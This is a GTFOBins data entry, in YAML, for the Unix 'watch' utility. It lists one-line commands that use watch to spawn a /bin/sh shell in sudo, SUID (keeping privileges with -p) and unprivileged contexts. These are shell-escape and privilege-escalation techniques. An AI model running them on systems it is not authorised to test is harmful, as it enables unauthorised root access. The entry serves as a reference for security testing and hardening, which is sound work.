<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/watch -->
---
functions:
  shell:
  - code: |-
      watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
    contexts:
      sudo:
      suid:
        code: |-
          watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
        shell: false
      unprivileged:
  - code: |-
      watch 'reset; exec /bin/sh 1>&0 2>&0'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
